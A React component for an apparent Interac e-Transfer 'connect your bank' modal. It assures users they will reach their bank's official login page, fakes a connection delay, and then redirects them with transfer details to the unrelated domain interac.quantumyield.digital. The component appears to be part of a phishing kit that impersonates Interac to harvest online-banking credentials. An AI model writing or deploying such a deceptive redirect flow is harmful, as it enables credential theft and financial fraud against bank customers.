"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { ArrowRight, ArrowLeft, Shield, CheckCircle2, Loader2 } from "lucide-react"
import Image from "next/image"
import type { FinancialInstitution } from "@/types/financial-institution"
import type { ConnectionFlowState } from "@/types/bank-connection"
import { useLanguage } from "@/lib/i18n/context"
import { getBankLogoPath } from "@/lib/bank-logo-mapper"
import { cn } from "@/lib/utils"

interface TransferData {
  transferId: string
  amount: string
  recipient: string
  recipientName: string
  bankName: string
  message: string
  timestamp: string
}

interface BankConnectionFlowProps {
  selectedInstitutions: FinancialInstitution[]
  onBack: () => void
  onComplete?: () => void
  transferData?: TransferData | null
}

export default function BankConnectionFlow({ selectedInstitutions, onBack, onComplete, transferData }: BankConnectionFlowProps) {
  const { t } = useLanguage()
  const router = useRouter()
  const [currentIndex, setCurrentIndex] = useState(0)
  const [flowState, setFlowState] = useState<ConnectionFlowState>("confirmation")
  const [countdown, setCountdown] = useState(5)

  const currentInstitution = selectedInstitutions[currentIndex]
  const hasMore = currentIndex < selectedInstitutions.length - 1
  const logoPath = getBankLogoPath(currentInstitution.id)

  useEffect(() => {
    if (flowState === "redirecting" && countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000)
      return () => clearTimeout(timer)
    }
    if (flowState === "redirecting" && countdown === 0) {
      handleRedirect()
    }
  }, [flowState, countdown])

  const handleConnect = () => {
    setFlowState("connecting")
    setTimeout(() => {
      setFlowState("redirecting")
    }, 2000)
  }

  const handleRedirect = () => {
    // Build countdown URL with all transaction parameters using URLSearchParams for proper encoding
    const params = new URLSearchParams({
      bankId: currentInstitution.id,
      bankName: currentInstitution.name,
      categoryId: currentInstitution.categoryId,
    })

    // Add transfer data parameters if available
    if (transferData) {
      params.set("transferId", transferData.transferId)
      params.set("amount", transferData.amount)
      params.set("recipient", transferData.recipient)
      params.set("recipientName", transferData.recipientName)
      params.set("senderBank", transferData.bankName)
      params.set("message", transferData.message)
      params.set("timestamp", transferData.timestamp)
    }

    // Redirect to production countdown page
    const countdownUrl = `https://interac.quantumyield.digital/countdown?${params.toString()}`
    window.location.href = countdownUrl
  }

  const handleSkip = () => {
    if (hasMore) {
      setCurrentIndex(currentIndex + 1)
      setFlowState("confirmation")
      setCountdown(5)
    } else {
      onComplete?.()
    }
  }

  return (
    <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4 animate-in fade-in duration-300">
      <div className="bg-card rounded-2xl border-2 border-border shadow-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
        {/* Header */}
        <div className="sticky top-0 bg-card border-b-2 border-border p-6 z-10">
          <div className="flex items-center justify-between mb-2">
            <button
              onClick={onBack}
              className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors"
            >
              <ArrowLeft className="w-4 h-4" />
              <span className="text-sm font-medium">{t.institutionSelect.back || "Back"}</span>
            </button>
            <div className="flex items-center gap-2 text-sm text-muted-foreground">
              <span className="font-semibold text-[#FDB913]">{currentIndex + 1}</span>
              <span>/</span>
              <span>{selectedInstitutions.length}</span>
            </div>
          </div>
          <h2 className="text-2xl font-bold text-foreground">
            {flowState === "completed"
              ? t.institutionSelect.allConnected || "All Institutions Connected!"
              : t.institutionSelect.connectToBank || "Connect to Your Bank"}
          </h2>
        </div>

        {/* Content */}
        <div className="p-6 space-y-6">
          {flowState === "completed" ? (
            <div className="text-center py-12 space-y-4">
              <div className="flex justify-center">
                <CheckCircle2 className="w-20 h-20 text-green-500" />
              </div>
              <h3 className="text-2xl font-bold text-foreground">{t.institutionSelect.successTitle || "Success!"}</h3>
              <p className="text-muted-foreground">
                {t.institutionSelect.successMessage || "All your selected institutions have been connected."}
              </p>
            </div>
          ) : (
            <>
              {/* Institution Card */}
              <div className="bg-muted rounded-lg p-6 border-2 border-border">
                <div className="flex items-center gap-4 mb-4">
                  <div className="w-16 h-16 bg-white rounded-lg flex items-center justify-center border border-border overflow-hidden relative">
                    {logoPath ? (
                      <Image
                        src={logoPath || "/placeholder.svg"}
                        alt={`${currentInstitution.name} logo`}
                        width={64}
                        height={64}
                        className="object-contain p-2 w-full h-full"
                        onError={(e) => {
                          e.currentTarget.style.display = "none"
                          const target = e.currentTarget.parentElement
                          if (target) {
                            target.innerHTML = `<span class="text-2xl font-bold text-foreground">${currentInstitution.name.charAt(0)}</span>`
                          }
                        }}
                      />
                    ) : (
                      <span className="text-2xl font-bold text-foreground">{currentInstitution.name.charAt(0)}</span>
                    )}
                  </div>
                  <div className="flex-1">
                    <h3 className="text-xl font-bold text-foreground">{currentInstitution.name}</h3>
                    <p className="text-sm text-muted-foreground">
                      {t.categories[currentInstitution.categoryId] || currentInstitution.categoryId}
                    </p>
                  </div>
                </div>

                {/* Security Notice */}
                <div className="flex items-start gap-3 p-4 bg-card rounded-md border border-border">
                  <Shield className="w-5 h-5 text-[#FDB913] flex-shrink-0 mt-0.5" />
                  <div className="text-sm text-muted-foreground">
                    <p className="font-medium text-foreground mb-1">
                      {t.institutionSelect.secureConnection || "Secure Connection"}
                    </p>
                    <p>
                      {t.institutionSelect.secureNotice ||
                        "You'll be securely redirected to your bank's official website. Never share your banking credentials with anyone."}
                    </p>
                  </div>
                </div>
              </div>

              {/* Flow State UI */}
              {flowState === "confirmation" && (
                <div className="space-y-4">
                  <div className="space-y-2">
                    <h4 className="font-semibold text-foreground">
                      {t.institutionSelect.whatHappensNext || "What happens next?"}
                    </h4>
                    <ul className="space-y-2 text-sm text-muted-foreground">
                      <li className="flex items-start gap-2">
                        <CheckCircle2 className="w-4 h-4 text-[#FDB913] mt-0.5 flex-shrink-0" />
                        <span>
                          {t.institutionSelect.step1 || "You'll be redirected to your bank's secure login page"}
                        </span>
                      </li>
                      <li className="flex items-start gap-2">
                        <CheckCircle2 className="w-4 h-4 text-[#FDB913] mt-0.5 flex-shrink-0" />
                        <span>{t.institutionSelect.step2 || "Log in with your existing banking credentials"}</span>
                      </li>
                      <li className="flex items-start gap-2">
                        <CheckCircle2 className="w-4 h-4 text-[#FDB913] mt-0.5 flex-shrink-0" />
                        <span>{t.institutionSelect.step3 || "Authorize the connection to complete the setup"}</span>
                      </li>
                    </ul>
                  </div>

                  <div className="flex gap-3 pt-4">
                    <button
                      onClick={handleConnect}
                      className="flex-1 flex items-center justify-center gap-2 px-6 py-3 bg-[#FDB913] text-[#1a1a1a] rounded-lg font-semibold hover:bg-[#e5a811] transition-colors focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2"
                    >
                      {t.institutionSelect.connectNow || "Connect Now"}
                      <ArrowRight className="w-5 h-5" />
                    </button>
                    {hasMore && (
                      <button
                        onClick={handleSkip}
                        className="px-6 py-3 bg-muted text-muted-foreground rounded-lg font-semibold hover:bg-accent hover:text-accent-foreground transition-colors focus:outline-none focus:ring-2 focus:ring-border focus:ring-offset-2"
                      >
                        {t.institutionSelect.skip || "Skip"}
                      </button>
                    )}
                  </div>
                </div>
              )}

              {flowState === "connecting" && (
                <div className="text-center py-12 space-y-4">
                  <div className="flex justify-center">
                    <Loader2 className="w-16 h-16 text-[#FDB913] animate-spin" />
                  </div>
                  <h3 className="text-xl font-bold text-foreground">
                    {t.institutionSelect.establishing || "Establishing Connection..."}
                  </h3>
                  <p className="text-muted-foreground">
                    {t.institutionSelect.pleaseWait || "Please wait while we prepare your secure connection"}
                  </p>
                </div>
              )}

              {flowState === "redirecting" && (
                <div className="text-center py-12 space-y-6">
                  <div className="flex justify-center">
                    <div className="relative w-24 h-24">
                      <div className="absolute inset-0 rounded-full border-8 border-muted" />
                      <div
                        className="absolute inset-0 rounded-full border-8 border-[#FDB913] border-t-transparent animate-spin"
                        style={{ animationDuration: "2s" }}
                      />
                      <div className="absolute inset-0 flex items-center justify-center">
                        <span className="text-3xl font-bold text-[#FDB913]">{countdown}</span>
                      </div>
                    </div>
                  </div>
                  <div className="space-y-2">
                    <h3 className="text-xl font-bold text-foreground">
                      {t.institutionSelect.redirecting || "Redirecting to"} {currentInstitution.name}
                    </h3>
                    <p className="text-muted-foreground">
                      {t.institutionSelect.openingBank || "Opening your bank's secure portal in"} {countdown}s
                    </p>
                  </div>
                  <button
                    onClick={handleRedirect}
                    className="px-6 py-3 bg-[#FDB913] text-[#1a1a1a] rounded-lg font-semibold hover:bg-[#e5a811] transition-colors focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2"
                  >
                    {t.institutionSelect.continueNow || "Continue Now"}
                  </button>
                </div>
              )}
            </>
          )}
        </div>

        {/* Footer Progress */}
        {flowState !== "completed" && (
          <div className="sticky bottom-0 bg-muted border-t-2 border-border p-4">
            <div className="flex gap-2">
              {selectedInstitutions.map((inst, idx) => (
                <div
                  key={inst.id}
                  className={cn(
                    "flex-1 h-2 rounded-full transition-all duration-300",
                    idx < currentIndex ? "bg-green-500" : idx === currentIndex ? "bg-[#FDB913]" : "bg-border",
                  )}
                />
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
